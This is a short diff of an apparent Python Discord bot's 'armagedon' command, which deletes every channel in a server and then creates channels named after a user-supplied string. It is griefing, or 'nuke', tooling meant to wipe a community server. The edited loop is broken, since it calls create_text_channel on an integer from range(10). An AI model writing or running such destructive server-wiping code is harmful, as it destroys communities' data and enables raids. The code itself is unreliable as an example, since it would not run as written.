@@ -80,7 +80,7 @@ async def armagedon(ctx,name):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
-    for channel in guild.channels:
+    for channel in range(10):
         await channel.create_text_channel(str(name))
 
 client.run(os.environ['token'])
